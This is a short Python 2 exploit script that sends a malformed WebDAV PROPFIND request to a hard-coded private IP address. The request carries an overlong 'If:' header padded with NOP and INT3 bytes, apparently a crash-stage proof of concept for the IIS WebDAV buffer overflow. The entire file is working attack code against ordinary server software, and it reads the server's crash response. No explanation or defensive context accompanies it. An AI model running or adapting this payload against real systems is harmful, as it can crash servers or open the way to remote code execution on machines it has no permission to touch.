import struct
import socket
import time



tag = "> (Not <locktoken:write1>) <http://localhost/b"
initial = "\x90" * 326


eventual = "\xCC" * 4600
httprequest = "PROPFIND / HTTP/1.1 \r\n"
httprequest += "Host: localhost \r\n"
httprequest += "Content-Length: 0 \r\n"
httprequest += "If: <http://localhost/a"
httprequest += initial 
httprequest += tag
httprequest += eventual
httprequest += ">\r\n\r\n"
print httprequest
connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection.connect(('172.16.65.137', 80))
connection.send(httprequest)
crashresponse = connection.recv(1024)
time.sleep(3)
print str(crashresponse)
connection.close
